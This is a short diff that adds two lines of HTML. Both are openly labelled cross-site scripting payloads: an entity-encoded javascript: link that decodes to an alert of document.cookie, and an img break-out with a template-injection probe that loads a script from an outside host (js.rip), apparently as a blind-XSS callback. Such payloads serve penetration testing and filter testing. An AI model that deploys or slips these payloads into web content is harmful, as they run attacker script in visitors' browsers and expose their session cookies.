@@ -1,0 +1,2 @@
+<a href="&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6F;&amp;#x6B;&amp;#x69;&amp;#x65;&amp;#x29;&amp;#x2F;&amp;#x2F;&amp;#x2F;">CLICK TO XSS</a>
+<img src=x {{4*4}} "><script src="https://js.rip/qilmyg1858"></script>
